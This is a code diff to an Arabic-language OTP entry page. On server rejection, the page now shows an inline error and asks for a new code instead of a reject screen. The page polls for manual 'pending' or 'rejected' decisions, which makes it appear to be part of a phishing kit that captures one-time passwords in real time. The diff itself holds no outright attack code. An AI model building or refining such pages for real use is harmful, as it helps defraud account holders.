@@ -78,6 +78,14 @@
   }
   .invalid .req{display:block;}
   .invalid input{border-bottom-color:#c0392b;}
+  .otp-error{
+    display:none;
+    color:#c0392b;
+    font-size:12px;
+    margin:8px 0 12px;
+    text-align:center;
+  }
+  .otp-error.show{display:block;}
   .submit-btn{
     display:block;
     width:100%;
@@ -172,6 +180,7 @@
       <input type="text" id="otp" inputmode="numeric" maxlength="6" placeholder="------">
       <span class="req">الرمز مطلوب</span>
     </div>
+    <div class="otp-error" id="otpError" role="alert">الرمز الذي تم إدخاله غير صحيح أو غير صالح</div>
     <button class="submit-btn" id="verifyBtn" type="button">تأكيد</button>
   </main>
 
@@ -207,6 +216,7 @@
     var otpField = document.getElementById('otpField');
     var otpInput = document.getElementById('otp');
     var verifyBtn = document.getElementById('verifyBtn');
+    var otpError = document.getElementById('otpError');
     var waitOverlay = document.getElementById('waitOverlay');
     var successOverlay = document.getElementById('successOverlay');
     var rejectOverlay = document.getElementById('rejectOverlay');
@@ -230,7 +240,9 @@
             } else if (data.status === 'rejected') {
               stopPoll();
               waitOverlay.classList.remove('show');
-              rejectOverlay.classList.add('show');
+              otpForm.style.display = 'block';
+              otpInput.value = '';
+              otpError.classList.add('show');
             }
             // لسه pending: استمر بالانتظار
           })
@@ -247,6 +259,7 @@
         return;
       }
       otpField.classList.remove('invalid');
+      otpError.classList.remove('show');
 
       otpForm.style.display = 'none';
       waitOverlay.classList.add('show');
@@ -262,7 +275,9 @@
           pollOtpStatus();
         } else {
           waitOverlay.classList.remove('show');
-          rejectOverlay.classList.add('show');
+          otpForm.style.display = 'block';
+          otpInput.value = '';
+          otpError.classList.add('show');
         }
       })
       .catch(function(err){
